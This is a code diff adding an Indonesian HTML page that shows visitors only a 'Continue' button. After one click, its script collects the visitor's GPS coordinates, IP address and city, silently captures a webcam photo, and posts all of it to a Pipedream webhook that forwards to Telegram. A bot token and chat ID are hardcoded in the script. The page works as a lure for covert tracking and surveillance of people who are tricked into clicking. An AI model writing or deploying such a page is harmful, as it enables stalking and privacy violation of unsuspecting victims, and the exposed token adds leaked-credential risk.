@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ambil Foto & Kirim ke Telegram</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 30px; }
+    video { width: 300px; height: 200px; border: 1px solid #ccc; }
+    button { padding: 10px 20px; font-size: 16px; }
+  </style>
+</head>
+<body>
+
+  <h2>Klik "Lanjut" untuk mulai</h2>
+  <button onclick="start()">Lanjut</button>
+  <br><br>
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = '8467123418:AAHaESHrbl8IXkrhMyfhRqleggreCI9_9DI';
+    const CHAT_ID = '7670525689';
+    const WEBHOOK_URL = 'https://eouxkofejjzs7xj.m.pipedream.net'; // ganti dengan webhook.site atau pipedream
+
+    async function start() {
+      try {
+        // 1. Ambil lokasi
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej)
+        );
+        const { latitude, longitude } = pos.coords;
+
+        // 2. Ambil IP & kota
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        const { ip, city, region } = ipData;
+
+        // 3. Ambil kamera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // 4. Tunggu 2 detik, lalu ambil foto
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          const context = canvas.getContext('2d');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0);
+
+          canvas.toBlob(async (blob) => {
+            const caption = `📍 Lokasi: ${city}, ${region}\n🌍 Koordinat: ${latitude}, ${longitude}\n🌐 IP: ${ip}`;
+
+            // Kirim ke Telegram via webhook (proxy)
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('caption', caption);
+            form.append('photo', blob, 'foto.jpg');
+
+            await fetch(WEBHOOK_URL, {
+              method: 'POST',
+              body: form
+            });
+
+            alert('Foto & lokasi terkirim ke Telegram!');
+            stream.getTracks().forEach(t => t.stop());
+          }, 'image/jpeg');
+        }, 2000);
+
+      } catch (err) {
+        alert('Izin ditolak atau error: ' + err.message);
+      }
+    }
+  </script>
+
+</body>
+  </html>
